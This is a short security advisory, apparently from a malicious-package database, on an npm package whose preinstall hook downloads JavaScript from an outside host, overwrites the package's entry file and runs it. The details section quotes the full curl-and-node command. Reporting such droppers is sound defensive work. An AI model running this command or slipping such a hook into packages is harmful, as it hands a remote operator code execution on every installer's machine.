summary: preinstall script fetches and executes remote JavaScript from attacker-controlled host
details: package.json declares a preinstall hook that runs `curl https://poc.amanrawat.com/hehe.js -o index.js && node index.js`. On every `npm install`, this downloads an unpinned, unverified script from poc.amanrawat.com, overwrites the package's own index.js with the response, and immediately executes it under Node. Because the downloaded file replaces the package's main entry, the same attacker-controlled bytes also execute on any subsequent `require()` of the package. The remote content can change at any time, giving the host operator full code execution on every installer machine. The package name (`sn-internal-testjgsakjdkjadkjah`) and lack of any legitimate functionality are consistent with a test/proof-of-concept dropper rather than a real library.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
